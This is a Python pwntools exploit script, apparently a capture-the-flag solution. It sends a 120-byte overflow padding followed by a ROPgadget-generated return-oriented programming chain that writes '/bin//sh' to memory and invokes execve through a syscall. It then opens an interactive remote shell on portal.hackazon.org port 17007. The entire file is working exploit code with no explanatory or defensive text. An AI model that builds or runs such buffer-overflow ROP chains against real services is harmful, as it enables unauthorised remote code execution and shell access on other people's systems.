#!/usr/bin/env python3
# execve generated by ROPgadget

from pwn import *
from struct import pack

# Padding goes here
rop = b''

rop += pack('<Q', 0x00000000004087ce) # pop rsi ; ret
rop += pack('<Q', 0x00000000004b50e0) # @ .data
rop += pack('<Q', 0x000000000044c043) # pop rax ; ret
rop += b'/bin//sh'
rop += pack('<Q', 0x000000000044dbc1) # mov qword ptr [rsi], rax ; ret
rop += pack('<Q', 0x00000000004087ce) # pop rsi ; ret
rop += pack('<Q', 0x00000000004b50e8) # @ .data + 8
rop += pack('<Q', 0x000000000043c165) # xor rax, rax ; ret
rop += pack('<Q', 0x000000000044dbc1) # mov qword ptr [rsi], rax ; ret
rop += pack('<Q', 0x0000000000401931) # pop rdi ; ret
rop += pack('<Q', 0x00000000004b50e0) # @ .data
rop += pack('<Q', 0x00000000004087ce) # pop rsi ; ret
rop += pack('<Q', 0x00000000004b50e8) # @ .data + 8
rop += pack('<Q', 0x00000000004016eb) # pop rdx ; ret
rop += pack('<Q', 0x00000000004b50e8) # @ .data + 8
rop += pack('<Q', 0x000000000043c165) # xor rax, rax ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x000000000046da90) # add rax, 1 ; ret
rop += pack('<Q', 0x00000000004011fa) # syscall

p = remote('portal.hackazon.org', 17007)
payload = b'A'*120 + rop

payload = payload.ljust(1000, b'\x00')

p.sendline(payload)

p.interactive()